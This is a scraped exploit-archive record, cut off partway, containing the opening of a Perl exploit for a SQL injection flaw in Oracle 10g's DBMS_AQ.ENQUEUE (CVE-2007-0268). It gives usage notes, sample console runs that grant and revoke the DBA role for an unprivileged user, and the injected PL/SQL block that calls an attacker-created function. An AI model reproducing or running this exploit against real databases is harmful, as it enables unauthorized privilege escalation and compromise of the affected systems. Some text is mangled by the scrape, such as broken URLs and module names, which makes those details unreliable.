{
    "text": "date_time:Apr 2, 2007 ， title:dbms_aq-enqueue.txt  ， detail:Oracle 10g DBMS_AQ.ENQUEUE remote SQL injection exploit that allows you to grant or revoke dba permission to an unpriviileged user.  ， cve:advisories | CVE-2007-0268  ， date_time:Apr 2, 2007  ， desc:#!/usr/bin/perl  ，  ， # [0-day] Remote Oracle DBMS_AQ.ENQUEUE exploit (10g)  ，  ， # Grant or revoke dba permission to unprivileged user  ，  ， # Tested on \"Oracle Database 10g Enterprise Edition Release 10.1.0.3.0\"  ，  ， # AUTHOR: Andrea \"bunker\" Purificato  ， # http:/rawlab.mindcreations.com  ，  ， # DATE: Copyright 2007 - Mon Apr 2 11:54:22 CEST 2007  ，  ， # PATCH: http:/www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2007.html  ， # (CVE-2007-0268 ?)  ，   ， # Oracle InstantClient (basic + sdk) required for DBD:Oracle  ，   ， # bunker@fin:~/orasploit$ perl dbms_aq-enqueue.pl -h localhost -s test -u bunker -p * -r  ， # [-] Wait.  ， # [-] Revoking DBA from BUNKER.  ， # DBD:Oracle:db do failed: ORA-01951: ROLE 'DBA' not granted to 'BUNKER' (DBD ERROR: OCIStmtExecute) [for Statement \"REVOKE DBA FROM BUNKER\"] at dbms_aq-enqueue.pl line 95.  ， # [-] Done!  ，  ， # bunker@fin:~/orasploit$ perl dbms_aq-enqueue.pl -h localhost -s test -u bunker -p * -g  ， # [-] Wait.  ， # [-] Creating evil function.  ， # [-] Go .(don't worry about errors)!  ， # DBD:Oracle:st execute failed: ORA-25205: the QUEUE BUNKER.'burp' does not exist  ， # ORA-06512: at \"SYS.DBMS_AQ\", line 6  ， # ORA-06512: at \"SYS.DBMS_AQ\", line 215  ， # ORA-06512: at line 10 (DBD ERROR: OCIStmtExecute) [for Statement \"  ， # DECLARE  ， # ident VARCHAR2(100);  ， # enq_opt dbms_aq.enqueue_options_t;  ， # msg_prp dbms_aq.message_properties_t;  ， # msgid raw(100);  ， # payload raw(100);  ， # BEGIN  ， # ident := '\"'|BUNKER.own|'\"';  ， # dbms_aq.enqueue(ident, enq_opt,msg_prp, payload, msgid);  ， # END;  ， # \"] at dbms_aq-enqueue.pl line 125.  ， # [-] YOU GOT THE POWAH!  ，  ， # bunker@fin:~/orasploit$ perl dbms_aq-enqueue.pl -h localhost -s test -u bunker -p * -r  ， # [-] Wait.  ， # [-] Revoking DBA from BUNKER.  ， # [-] Done!  ，  ， use warnings;  ， use strict;  ， use DBI;  ， use Getopt:Std;  ， use vars qw/ %opt /;  ， sub usage {"
}